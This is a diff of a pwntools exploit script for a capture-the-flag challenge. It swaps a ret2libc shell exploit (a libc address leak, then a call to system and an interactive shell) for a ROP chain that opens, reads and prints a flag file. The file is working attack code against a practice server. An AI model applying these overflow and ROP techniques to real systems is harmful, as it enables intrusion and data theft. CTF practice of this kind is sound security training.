@@ -2,36 +2,23 @@
 
 from pwn import *
 
-# r = remote('127.0.0.1', 8888)
 r = remote('csie.ctf.tw', 10114)
 
-main = 0x0804855c
+open_plt = 0x080483c0
+read_plt = 0x08048390
 write_plt = 0x080483e0
-write_got = 0x0804a020
-puts_plt = 0x08048420
-puts_got = 0x0804a018
 
-puts_off = 0x65650     # Ubuntu 14.04.2 /lib/i386-linux-gnu/libc.so.6
-write_off = 0xd9da0
-system_off = 0x40190
-gets_off = 0x64cd0
+open_para1 = 0x08048722 # "/home/xorflag/flag"
 
-r.send('A'*103 +
-    p32(0x0804866b) +
-    p32(main) +
-    p32(write_got) + '\n')
+gadget_pop2 = 0x080486de
+gadget_pop3 = 0x080486dd
 
-#r.send('A'*116 +
-#    p32(puts_plt) + p32(main) + p32(puts_got) + '\n')
+r.send('A'*104 +
+    p32(open_plt) + p32(gadget_pop2) + p32(open_para1) + p32(0x0) +
+    p32(read_plt) + p32(gadget_pop3) + p32(0x3) + p32(0x0804a02c) + p32(0xff) +
 
-base = u32(r.recvline()[:4]) - write_off
+    p32(write_plt) + p32(gadget_pop3) + p32(0x1) + p32(0x0804a02c) + p32(0xff) + '\n')
 
-print 'libc base =', hex(base)
+print r.recvline()
 
-system = base + system_off
-gets = base + gets_off
-
-r.send('A'*124 +
-    p32(gets) + p32(system) + p32(puts_got) + p32(puts_got) + '\n')
-
-r.interactive()
+# r.interactive()
